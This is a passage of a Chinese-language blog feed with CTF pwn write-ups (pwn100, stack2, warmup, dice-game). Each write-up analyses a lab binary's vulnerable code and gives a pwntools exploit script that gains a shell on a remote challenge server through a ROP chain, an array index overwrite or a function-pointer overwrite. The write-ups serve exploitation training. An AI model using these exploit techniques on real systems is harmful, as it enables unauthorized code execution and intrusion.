    <published>2019-08-22T02:40:31.000Z</published>
    <updated>2019-08-22T03:09:38.989Z</updated>
    
    <content type="html"><![CDATA[<h2 id="溢出点"><a href="#溢出点" class="headerlink" title="溢出点:"></a>溢出点:</h2><p>自己定义了一个read函数，是在原来的read上进行包装，读满200个字节才退出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">my_read</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + a1), <span class="number">1u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而read读到的内容是放在调用函数这一层<code>rbp</code>-0x40h的地方，肯定会溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40068E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  my_read((__int64)&amp;v1, <span class="number">200</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"bye~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/mnt/hgfs/linux_share/pwn/xctf/pwn100/pwn100'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>泄露<code>libc</code>版本，然后调用<code>system(&#39;/bin.sh&#39;)</code></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = process('./pwn100')</span></span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="number">45415</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'b*0x00000000004006B6')</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn100'</span>)</span><br><span class="line">start_addr =<span class="number">0x00000000004006B8</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400763</span></span><br><span class="line"></span><br><span class="line">payload1 = (<span class="number">0x48</span>*<span class="string">'a'</span>+p64(pop_rdi)+p64(elf.got[<span class="string">'puts'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(start_addr)).ljust(<span class="number">200</span>,<span class="string">'a'</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'bye~\n'</span>)</span><br><span class="line">unpack = p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">put_addr = hex(u64(unpack))</span><br><span class="line">info(<span class="string">'puts: '</span>+ put_addr)</span><br><span class="line"></span><br><span class="line">payload2 = (<span class="number">0x48</span>*<span class="string">'a'</span>+p64(pop_rdi)+p64(elf.got[<span class="string">'read'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(start_addr)).ljust(<span class="number">200</span>,<span class="string">'a'</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'bye~\n'</span>)</span><br><span class="line">unpack = p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">read_addr = hex(u64(unpack))</span><br><span class="line">info(<span class="string">'read: '</span>+ read_addr)</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"puts"</span>, int(put_addr,<span class="number">16</span>))</span><br><span class="line">obj.add_condition(<span class="string">'read'</span>, int(read_addr,<span class="number">16</span>))</span><br><span class="line">system = int(put_addr,<span class="number">16</span>) + obj.dump(<span class="string">"system"</span>) - obj.dump(<span class="string">'puts'</span>)</span><br><span class="line">bin_sh = int(put_addr,<span class="number">16</span>) + obj.dump(<span class="string">"str_bin_sh"</span>) - obj.dump(<span class="string">'puts'</span>)</span><br><span class="line">payload3 = (<span class="number">0x48</span>*<span class="string">'a'</span>+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(start_addr)).ljust(<span class="number">200</span>,<span class="string">'a'</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这个<code>LibcSearcher</code>的添加条件功能不太会用，不知道为啥加了条件出来的结果反而变多了，我就手动选了一个，竟然一次就对了- -，我选的<code>3</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Multi Results:</span><br><span class="line"> 0: archive-old-glibc (id libc6-amd64_2.24-3ubuntu1_i386)</span><br><span class="line"> 1: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2.2_i386)</span><br><span class="line"> 2: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2_i386)</span><br><span class="line"> 3: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span><br><span class="line"> 4: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span><br><span class="line"> 5: archive-old-glibc (id libc6-amd64_2.24-3ubuntu2.2_i386)</span><br><span class="line"> 6: archive-old-glibc (id libc6-i386_2.19-10ubuntu2.3_amd64)</span><br><span class="line">Please supply more info using </span><br><span class="line">    add_condition(leaked_func, leaked_address).</span><br><span class="line">You can choose it by hand</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;溢出点&quot;&gt;&lt;a href=&quot;#溢出点&quot; class=&quot;headerlink&quot; title=&quot;溢出点:&quot;&gt;&lt;/a&gt;溢出点:&lt;/h2&gt;&lt;p&gt;自己定义了一个read函数，是在原来的read上进行包装，读满200个字节才退出&lt;/p&gt;
&lt;figure class=&quot;high
      
    
    </summary>
    
    
      <category term="stack" scheme="http://yoursite.com/tags/stack/"/>
    
      <category term="overflow" scheme="http://yoursite.com/tags/overflow/"/>
    
  </entry>
  
  <entry>
    <title>stack2</title>
    <link href="http://yoursite.com/2019/08/21/stack2/"/>
    <id>http://yoursite.com/2019/08/21/stack2/</id>
    <published>2019-08-21T00:29:12.000Z</published>
    <updated>2019-08-21T01:32:02.131Z</updated>
    
    <content type="html"><![CDATA[<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑:"></a>程序逻辑:</h2><p>输入几个数，然后可以使用程序提供的4个功能进行操作，直到输入5程序才会退出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br></pre></td></tr></table></figure><h2 id="溢出点"><a href="#溢出点" class="headerlink" title="溢出点:"></a>溢出点:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br></pre></td></tr></table></figure><p>更改数的功能，下标v5的范围没有限制，会导致数组越界，我们可以利用他来向栈上更高地址的位置写入数据，将返回地址改写使他跳转到开shell的函数处执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackhere</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/bash"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题因为环境的问题远程服务器上没有<code>/bin/bash</code>的shell，可以用<code>sh</code>的shell，<code>/bin/sh</code>的地址是<code>0x08048980</code>，加7就是<code>sh</code>的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rodata:08048980 command         db &apos;/bin/bash&apos;,0        ; DATA XREF: hackhere+14↑o</span><br></pre></td></tr></table></figure><h2 id="栈上布局"><a href="#栈上布局" class="headerlink" title="栈上布局:"></a>栈上布局:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">low                 esp---&gt;  +-----------------+</span><br><span class="line">                             |   call system   |</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |       sh        |</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">high                         +-----------------+</span><br></pre></td></tr></table></figure><p>关于返回地址的位置，我一开始也以为是直接与<code>v13</code>相隔0x70的位置后来调试发现不对，是相差了132的地方，还是要以程序运行时的调试结果为准。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = process('./stack2')</span></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">45441</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,"b*0x080488EE")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_addr</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 0x080485B4 call  _system</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>,<span class="string">'132\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>,<span class="string">'180\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'133\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'133\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'134\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'4\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'135\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'8\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x08048987 '/bin/sh'[7]</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'136\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'135\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'137\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'137\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'138\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'4\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'which number to change:'</span>, <span class="string">'139\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'new number:'</span>, <span class="string">'8\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">'How many numbers you have:'</span>,<span class="string">'4\n'</span>)</span><br><span class="line">p.sendafter(<span class="string">'Give me your numbers'</span>,<span class="string">'1 2 3 4\n'</span>)</span><br><span class="line">set_addr()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;程序逻辑&quot;&gt;&lt;a href=&quot;#程序逻辑&quot; class=&quot;headerlink&quot; title=&quot;程序逻辑:&quot;&gt;&lt;/a&gt;程序逻辑:&lt;/h2&gt;&lt;p&gt;输入几个数，然后可以使用程序提供的4个功能进行操作，直到输入5程序才会退出。&lt;/p&gt;
&lt;figure class=&quot;hi
      
    
    </summary>
    
    
      <category term="stack" scheme="http://yoursite.com/tags/stack/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>warmup</title>
    <link href="http://yoursite.com/2019/08/20/warmup/"/>
    <id>http://yoursite.com/2019/08/20/warmup/</id>
    <published>2019-08-20T15:07:30.000Z</published>
    <updated>2019-08-20T15:35:02.641Z</updated>
    
    <content type="html"><![CDATA[<h2 id="溢出点"><a href="#溢出点" class="headerlink" title="溢出点:"></a>溢出点:</h2><p><code>scanf</code>输入字符串的时候没有检查长度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h]</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">__isoc99_scanf(<span class="string">"%s"</span>, v2);</span><br></pre></td></tr></table></figure><p>逻辑分析:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048702(v2[i]) )</span><br><span class="line">          v14 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="string">'@'</span> )</span><br><span class="line">          v14 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check2(v2[i]) )</span><br><span class="line">          v14 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="string">'.'</span> )</span><br><span class="line">          v14 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check3(v2[i]) )</span><br><span class="line">          v14 = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check3(v2[i]) )</span><br><span class="line">          v14 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check3(v2[i]) )</span><br><span class="line">          v14 = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check3(v2[i]) )</span><br><span class="line">          v14 = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v14 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这一大段其实就是依次检查我们输入的字符串的每一位并将v14置成对应的数，但其实这一段并没什么用</p><p>关键是这一段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*(&amp;v3 + --v14))();</span><br></pre></td></tr></table></figure><p><code>v3</code>加上<code>v14</code>减去1，将这个地址开始的指令当作函数来执行。v14初始值为1，我们简单点上面的检查都不通过，那么到这一步，地址就只取决于v3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v3)(); <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v4)(); <span class="comment">// [esp+34h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v5)(); <span class="comment">// [esp+38h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v6)(); <span class="comment">// [esp+3Ch] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v7)(); <span class="comment">// [esp+40h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v8)(); <span class="comment">// [esp+44h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v9)(); <span class="comment">// [esp+48h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v10)(); <span class="comment">// [esp+4Ch] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v11)(); <span class="comment">// [esp+50h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v12)(); <span class="comment">// [esp+54h] [ebp-30h]</span></span><br></pre></td></tr></table></figure><p>观察到v3的位置是在相对v2高地址的地方，我们可以通过v2的输入来覆盖v3的值</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = process('./forgot')</span></span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="number">42514</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'faint-star'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'A'</span>+p32(<span class="number">0x080486CC</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;溢出点&quot;&gt;&lt;a href=&quot;#溢出点&quot; class=&quot;headerlink&quot; title=&quot;溢出点:&quot;&gt;&lt;/a&gt;溢出点:&lt;/h2&gt;&lt;p&gt;&lt;code&gt;scanf&lt;/code&gt;输入字符串的时候没有检查长度&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;
      
    
    </summary>
    
    
      <category term="stack" scheme="http://yoursite.com/tags/stack/"/>
    
      <category term="overflow" scheme="http://yoursite.com/tags/overflow/"/>
    
  </entry>
  
  <entry>
    <title>dice-game</title>
    <link href="http://yoursite.com/2019/08/20/dice-game/"/>
    <id>http://yoursite.com/2019/08/20/dice-game/</id>
    <published>2019-08-20T14:11:56.000Z</published>
    <updated>2019-08-20T14:36:39.661Z</updated>
    
    <content type="html"><![CDATA[<h2 id="溢出点"><a href="#溢出点" class="headerlink" title="溢出点:"></a>溢出点:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">v6 = read(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br></pre></td></tr></table></figure><p>读进来的数据刚好能覆盖到<code>rbp</code>指针之前，无法覆盖返回地址。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h2><p>程序会不停的产生随机数，猜中50次就能得到flag。当然随机是伪随机，当<code>seed</code>一定时产生的数列是一定的，这个seed也是存放在栈上，溢出点虽然无法利用来覆盖返回地址，但是可以覆盖栈上的<code>local variable</code>。</p><h2 id="产生随机数"><a href="#产生随机数" class="headerlink" title="产生随机数:"></a>产生随机数:</h2><p>产生一个长度为50的<code>seed</code>为0的伪随机序列: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">srand(seed[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">49</span>; ++i )&#123;</span><br><span class="line"><span class="keyword">int</span> r = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>,r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p=process('./dice_game')</span></span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="number">35516</span>)</span><br><span class="line"></span><br><span class="line">index=<span class="number">0</span></span><br><span class="line">num = <span class="string">'2 5 4 2 6 2 5 1 4 2 3 2 3 2 6 5 1 1 5 5 6 3 4 4 3 3 3 2 2 2 6 1 1 1 6 4 2 5 2 5 4 4 4 6 3 2 3 3 6 1'</span>.split()</span><br><span class="line">payload = <span class="number">0x40</span>*<span class="string">'a'</span>+p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome, let me know your name: '</span>)</span><br><span 